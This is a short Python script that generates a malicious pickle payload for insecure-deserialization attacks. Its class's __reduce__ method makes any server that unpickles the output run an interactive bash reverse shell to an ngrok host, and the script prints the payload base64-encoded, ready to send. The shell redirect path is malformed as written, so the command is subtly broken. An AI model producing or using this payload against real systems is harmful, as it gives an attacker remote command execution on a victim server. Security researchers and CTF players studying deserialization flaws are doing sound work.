import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('bash -i >& /dev/https/559c1a78c710.ngrok.io 0>&1')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
